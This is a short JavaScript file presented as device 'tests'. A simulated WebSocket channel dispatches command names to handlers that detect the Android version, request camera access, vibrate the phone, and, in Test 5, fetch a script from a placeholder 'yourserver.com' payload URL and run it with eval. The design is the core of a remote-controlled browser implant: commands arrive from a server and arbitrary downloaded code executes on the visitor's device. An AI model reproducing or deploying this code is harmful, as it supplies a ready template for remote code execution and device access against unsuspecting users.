// Simulating WebSocket connection
const fakeWebSocket = {
  onmessage: null,
  send: function (command) {
    if (this.onmessage) {
      this.onmessage({ data: command });
    }
  },
};

// Define testing functions
const tests = {
  // Test 1: Detect Android version
  getAndroidVersion: function () {
    try {
      const userAgent = navigator.userAgent || navigator.vendor || window.opera;
      let androidVersion = "Unknown";
      if (/Android/.test(userAgent)) {
        const versionMatch = userAgent.match(/Android\s([0-9\.]*)/);
        if (versionMatch && versionMatch[1]) {
          androidVersion = versionMatch[1];
        }
      }
      console.log("Detected Android Version: " + androidVersion);
      return "Android Version: " + androidVersion;
    } catch (e) {
      return "Error detecting Android version: " + e.message;
    }
  },

  // Test 2: Attempt to write to memory
  writeToMemory: function () {
    try {
      window.testMemory = "Memory Test Success";
      return "Memory write successful!";
    } catch (e) {
      return "Error writing to memory: " + e.message;
    }
  },

  // Test 3: Access camera (may fail without permissions)
  accessCamera: function () {
    try {
      navigator.mediaDevices.getUserMedia({ video: true })
        .then((stream) => {
          console.log("Camera access success!");
          stream.getTracks().forEach((track) => track.stop());
        })
        .catch((err) => {
          console.error("Camera access error:", err.message);
        });
      return "Camera access attempted.";
    } catch (e) {
      return "Error accessing camera: " + e.message;
    }
  },

  // Test 4: Vibrate phone (requires vibration API support)
  vibratePhone: function () {
    try {
      if (navigator.vibrate) {
        navigator.vibrate([500, 200, 500]);
        return "Phone vibrated!";
      } else {
        return "Vibration API not supported.";
      }
    } catch (e) {
      return "Error vibrating phone: " + e.message;
    }
  },

  // Test 5: Attempt to fetch and execute a script (payload test)
  fetchAndExecuteScript: function () {
    const scriptUrl = "https://yourserver.com/testPayload.js"; // Replace with your payload URL
    try {
      fetch(scriptUrl)
        .then((response) => response.text())
        .then((script) => {
          eval(script); // Note: Using eval is risky; use cautiously and ethically
          console.log("Payload executed successfully!");
        })
        .catch((err) => {
          console.error("Error fetching payload:", err.message);
        });
      return "Payload fetch initiated.";
    } catch (e) {
      return "Error executing payload: " + e.message;
    }
  },
};

// Simulate WebSocket commands
fakeWebSocket.onmessage = function (event) {
  const command = event.data;
  if (tests[command]) {
    const result = tests[command]();
    console.log(result);
  } else {
    console.log("Unknown command: " + command);
  }
};

// Test all functions in sequence
Object.keys(tests).forEach((test) => {
  fakeWebSocket.send(test);
});
